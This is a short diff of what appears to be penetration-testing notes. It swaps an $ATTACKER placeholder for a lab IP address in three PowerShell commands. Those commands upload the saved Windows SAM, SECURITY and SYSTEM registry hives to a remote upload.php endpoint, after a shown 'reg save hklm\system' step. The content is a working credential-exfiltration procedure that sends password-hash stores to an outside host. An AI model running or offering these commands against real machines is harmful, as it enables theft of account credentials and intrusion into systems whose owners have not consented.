@@ -17,9 +17,9 @@ reg save hklm\system system.save
 ```
 
 ```text
-powershell (New-Object System.Net.WebClient).UploadFile('http://$ATTACKER/upload.php','sam.save')
-powershell (New-Object System.Net.WebClient).UploadFile('http://$ATTACKER/upload.php','security.save')
-powershell (New-Object System.Net.WebClient).UploadFile('http://$ATTACKER/upload.php','system.save')
+powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.189/upload.php','sam.save')
+powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.189/upload.php','security.save')
+powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.189/upload.php','system.save')
 ```
 
 ```text
